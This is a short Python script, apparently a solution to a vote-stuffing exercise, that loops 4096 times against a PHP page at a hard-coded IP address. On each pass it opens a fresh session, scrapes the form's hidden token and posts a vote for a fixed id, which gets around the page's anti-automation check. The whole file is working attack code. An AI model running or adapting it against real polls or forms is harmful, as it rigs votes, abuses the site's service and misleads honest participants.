#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup

url = "http://158.69.76.135/level1.php"
data = {"id": "4561", "holdthedoor": "holdthedoor", "key": ""}
if __name__ == "__main__":
    for i in range(0, 4096):
        votes = requests.session()
        page = votes.get(url)
        soup = BeautifulSoup(page.text, "html.parser")

        hvalue = soup.find("form", {"method": "post"})
        hvalue = hvalue.find("input", {"type": "hidden"})
        data["key"] = hvalue["value"]

        votes.post(url, data)
